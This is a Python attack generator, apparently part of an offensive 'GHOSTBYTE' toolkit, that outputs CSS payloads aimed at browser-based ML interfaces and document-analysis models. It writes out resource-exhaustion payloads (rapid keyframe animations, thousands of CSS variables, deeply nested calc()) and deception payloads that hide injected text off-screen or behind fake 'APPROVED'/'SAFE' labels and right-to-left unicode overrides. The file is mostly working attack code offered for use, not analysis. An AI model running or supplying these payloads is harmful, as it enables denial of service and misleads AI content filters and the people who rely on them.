#!/usr/bin/env python3
"""
🎨 CSS Attack Module
Cascading Style Sheets injection and manipulation attacks

Author: frankSx <fixes.it.frank@googlesmail.com>
13th Hour Research Division

Targets ML systems that parse or render CSS, including:
- Browser-based ML interfaces
- Document analysis systems
- Style extraction models
"""

import argparse
import random
import string
from typing import Dict, List, Optional


class CSSAttackGenerator:
    """Generate CSS-based attacks"""

    def __init__(self, seed: int = None):
        if seed:
            random.seed(seed)

    def generate_keyframe_poison(self, 
                                intensity: float = 0.5,
                                target_property: str = 'transform') -> str:
        """
        Generate keyframe animation that causes DoS or confusion

        Exploits: High-frequency animations, recursive transforms
        """
        duration = max(0.01, 0.1 - (intensity * 0.09))  # Very fast
        iterations = int(10 + intensity * 90)

        css = f'''
/* 🎨 GHOSTBYTE CSS Keyframe Poison */
/* Target: {target_property} */
/* Intensity: {intensity} */

@keyframes poison-{self._random_id()} {{
    0% {{ {target_property}: rotate(0deg) scale(1); }}
    25% {{ {target_property}: rotate(90deg) scale(1.5); filter: hue-rotate(90deg); }}
    50% {{ {target_property}: rotate(180deg) scale(0.5); filter: invert(1); }}
    75% {{ {target_property}: rotate(270deg) scale(2); filter: blur(5px); }}
    100% {{ {target_property}: rotate(360deg) scale(1); }}
}}

.poison-target {{
    animation: poison-{self._random_id()} {duration}s linear infinite;
    animation-iteration-count: {iterations};
    will-change: transform, filter;
    transform-origin: center;
}}

/* CPU exhaustion via multiple layers */
.poison-layer-1 {{ animation-delay: 0s; }}
.poison-layer-2 {{ animation-delay: {duration/4}s; }}
.poison-layer-3 {{ animation-delay: {duration/2}s; }}
.poison-layer-4 {{ animation-delay: {duration*0.75}s; }}
'''
        return css

    def generate_layout_confusion(self, 
                                 element_count: int = 100,
                                 chaos_level: float = 0.5) -> str:
        """
        Generate CSS that creates layout confusion

        Uses z-index stacking, absolute positioning chaos,
        and flexbox/grid manipulation.
        """
        css_parts = [
            '/* 🎨 GHOSTBYTE Layout Confusion Attack */',
            '/* Chaos Level: {chaos_level} */',
            '',
            '.chaos-container {',
            '    position: relative;',
            '    width: 100vw;',
            '    height: 100vh;',
            '    overflow: hidden;',
            '}',
            ''
        ]

        for i in range(element_count):
            z_index = random.randint(-1000, 1000)
            left = random.randint(-50, 150)
            top = random.randint(-50, 150)
            rotation = random.randint(0, 360)
            scale = 0.5 + random.random() * 1.5
            opacity = 0.1 + random.random() * 0.9

            css_parts.append(f'''.chaos-element-{i} {{
    position: absolute;
    left: {left}%;
    top: {top}%;
    z-index: {z_index};
    transform: rotate({rotation}deg) scale({scale:.2f});
    opacity: {opacity:.2f};
    mix-blend-mode: {random.choice(['multiply', 'screen', 'overlay', 'difference'])};
    pointer-events: none;
}}''')

        # Add animation to create temporal confusion
        css_parts.extend([
            '',
            '@keyframes chaos-drift {',
            '    0% { transform: translate(0, 0) rotate(0deg); }',
            '    25% { transform: translate(10px, -10px) rotate(5deg); }',
            '    50% { transform: translate(-5px, 15px) rotate(-3deg); }',
            '    75% { transform: translate(-15px, -5px) rotate(2deg); }',
            '    100% { transform: translate(0, 0) rotate(0deg); }',
            '}',
            '',
            '[class^="chaos-element-"] {',
            '    animation: chaos-drift 3s ease-in-out infinite;',
            '}'
        ])

        return '\n'.join(css_parts)

    def generate_pseudo_element_attack(self, 
                                      payload: str = 'MALICIOUS CONTENT') -> str:
        """
        Generate CSS using pseudo-elements for content injection

        Exploits ::before and ::after for hidden/overlaid content
        that may confuse text extraction ML.
        """
        css = f'''
/* 🎨 GHOSTBYTE Pseudo-Element Injection */

.visible-text::before {{
    content: "[APPROVED] ";
    color: green;
    font-weight: bold;
}}

.visible-text::after {{
    content: " {payload}";
    position: absolute;
    left: -9999px;  /* Hidden from view but present in DOM */
    color: transparent;
    font-size: 0;
}}

/* Overlay attack - invisible text over visible */
.overlay-attack {{
    position: relative;
}}

.overlay-attack::before {{
    content: "SAFE CONTENT";
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: white;
    color: black;
    z-index: 1000;
}}

/* Confusing extraction with attr() */
.confuse-attr[data-secret]::after {{
    content: attr(data-secret);
    display: none;
}}

/* Unicode injection in content */
.unicode-inject::before {{
    content: "\u202E"  /* RLO */ "{payload}" "\u202C";  /* PDF */
    color: transparent;
}}
'''
        return css

    def generate_variable_pollution(self, 
                                   var_count: int = 1000) -> str:
        """
        Generate CSS custom property pollution

        Creates thousands of CSS variables to exhaust
        parser resources or cause variable shadowing.
        """
        css_parts = [
            '/* 🎨 GHOSTBYTE CSS Variable Pollution */',
            f'/* Variable Count: {var_count} */',
            '',
            ':root {',
        ]

        for i in range(var_count):
            value = ''.join(random.choices(string.hexdigits, k=6))
            css_parts.append(f'    --ghostbyte-var-{i}: #{value};')

        css_parts.extend([
            '}',
            '',
            '/* Recursive variable references */',
            '.recursive-pollution {',
        ])

        # Create deeply nested variable references
        for i in range(min(50, var_count)):
            ref_depth = random.randint(1, 5)
            refs = ' '.join([f'var(--ghostbyte-var-{random.randint(0, var_count-1)})'] * ref_depth)
            css_parts.append(f'    --nested-{i}: {refs};')

        css_parts.append('}')

        return '\n'.join(css_parts)

    def generate_calc_exhaustion(self, 
                                depth: int = 50) -> str:
        """
        Generate deeply nested calc() expressions

        Causes parsing overhead and potential precision errors.
        """
        css_parts = [
            '/* 🎨 GHOSTBYTE Calc() Exhaustion */',
            f'/* Nesting Depth: {depth} */',
            ''
        ]

        # Build nested calc expression
        calc_expr = "100%"
        for i in range(depth):
            op = random.choice(['+', '-', '*', '/'])
            val = random.randint(1, 100)
            unit = random.choice(['px', '%', 'em', 'rem', 'vw', 'vh'])
            calc_expr = f"calc({calc_expr} {op} {val}{unit})"

        css_parts.extend([
            '.calc-exhaustion {',
            f'    width: {calc_expr};',
            f'    height: {calc_expr};',
            '    transition: all 0.3s;',
            '}',
            '',
            '/* Multiple complex calculations */',
        ])

        for i in range(20):
            nested = "50%"
            for _ in range(random.randint(10, 30)):
                nested = f"calc({nested} * 0.{random.randint(1, 99)})"
            css_parts.append(f'.calc-{i} {{ width: {nested}; }}')

        return '\n'.join(css_parts)

    def generate_ml_confusion_payload(self) -> str:
        """Generate comprehensive CSS payload for ML confusion"""
        return f'''
/* 🎨 GHOSTBYTE ML Confusion Payload */
/* Comprehensive CSS attack surface */

/* 1. Visual deception */
.deceptive {{
    color: white;
    text-shadow: 0 0 5px black, 0 0 5px black;
    background: linear-gradient(45deg, transparent 49%, white 50%, transparent 51%);
}}

/* 2. Text extraction confusion */
.extraction-trap {{
    font-family: 'Arial', sans-serif;
}}
.extraction-trap::before {{
    content: "SAFE";
    color: green;
}}
.extraction-trap span {{
    display: inline-block;
    transform: rotateY(180deg);
}}

/* 3. Layout analysis confusion */
.layout-ghost {{
    display: grid;
    grid-template-areas: 
        "a b c"
        "d e f"
        "g h i";
}}
.layout-ghost > * {{
    grid-area: e;  /* All items overlap */
}}

/* 4. Animation-based evasion */
.evasion-anim {{
    animation: hide-show 0.1s infinite;
}}
@keyframes hide-show {{
    0%, 49% {{ opacity: 0; visibility: hidden; }}
    50%, 100% {{ opacity: 1; visibility: visible; }}
}}

/* 5. Media query confusion */
@media screen and (min-width: 1px) {{
    .always-hidden {{ display: none; }}
}}
@media screen and (max-width: 99999px) {{
    .always-visible {{ display: block; }}
}}
'''

    def _random_id(self, length: int = 8) -> str:
        """Generate random ID"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def main():
    parser = argparse.ArgumentParser(description='🎨 GHOSTBYTE CSS Attack Generator')
    parser.add_argument('--mode', 
                       choices=['keyframes', 'layout', 'pseudo', 'variables', 'calc', 'ml-confusion'],
                       required=True)
    parser.add_argument('--output', '-o', default='css_attack.css')
    parser.add_argument('--intensity', type=float, default=0.5)
    parser.add_argument('--seed', type=int)

    args = parser.parse_args()

    gen = CSSAttackGenerator(seed=args.seed)

    if args.mode == 'keyframes':
        result = gen.generate_keyframe_poison(intensity=args.intensity)
    elif args.mode == 'layout':
        result = gen.generate_layout_confusion(chaos_level=args.intensity)
    elif args.mode == 'pseudo':
        result = gen.generate_pseudo_element_attack()
    elif args.mode == 'variables':
        result = gen.generate_variable_pollution(var_count=int(100 + args.intensity * 900))
    elif args.mode == 'calc':
        result = gen.generate_calc_exhaustion(depth=int(10 + args.intensity * 90))
    elif args.mode == 'ml-confusion':
        result = gen.generate_ml_confusion_payload()

    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(result)

    print(f"🎨 CSS attack generated: {args.output}")
    print(f"   Mode: {args.mode}")
    print(f"   Intensity: {args.intensity}")


if __name__ == '__main__':
    main()
